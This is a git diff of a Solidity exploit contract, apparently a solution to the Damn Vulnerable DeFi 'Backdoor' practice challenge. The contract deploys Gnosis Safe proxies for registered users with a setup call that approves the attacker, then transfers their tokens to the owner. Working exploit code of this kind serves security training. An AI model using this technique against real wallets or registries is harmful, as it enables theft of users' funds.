@@ -1,5 +1,6 @@
 import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
 import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
+import "hardhat/console.sol";
 
 
 import "../DamnValuableToken.sol";
@@ -16,21 +17,25 @@ contract AttackBackdoor {
         address _factory,
         address _masterCopy,
         address _walletRegistry,
-        address _token
+        address _token,
+        address[] memory users
     ) {
         owner = _owner;
         factory = _factory;
         masterCopy = _masterCopy;
         walletRegistry = _walletRegistry;
         token = _token;
-    }
 
-    function setupToken(address _tokenAddress, address _attacker) external {
-        DamnValuableToken(_tokenAddress).approve(_attacker, 10 ether);
-    }
+        string memory setupTokenSignature = "approve(address,uint256)";
+        bytes memory setupData = abi.encodeWithSignature(
+            setupTokenSignature,
+            address(this),
+            10 ether
+            );
 
-    
-    function exploit(address[] memory users, bytes memory setupData) external {
+        console.logBytes(setupData);
+        // return;
+
         for (uint256 i = 0; i < users.length; i++) {
             // Need to create a dynamically sized array for the user to meet signature req's
             address user = users[i];
@@ -44,7 +49,7 @@ contract AttackBackdoor {
                 signatureString,
                 victim,
                 uint256(1),
-                address(this),
+                token,
                 setupData,
                 address(0),
                 address(0),
@@ -59,7 +64,8 @@ contract AttackBackdoor {
                     123,
                     IProxyCreationCallback(walletRegistry)
                 );
-
+            
+            console.log(DamnValuableToken(token).allowance(address(newProxy), address(this))); 
             DamnValuableToken(token).transferFrom(
                 address(newProxy),
                 owner,
@@ -67,4 +73,14 @@ contract AttackBackdoor {
             );
         }
     }
+
+    function setupToken(address _tokenAddress, address _attacker) external {
+        console.log("hi!");
+        DamnValuableToken(_tokenAddress).approve(_attacker, 10 ether);
+    }
+
+    
+    // function exploit() external {
+        
+    // }
 }
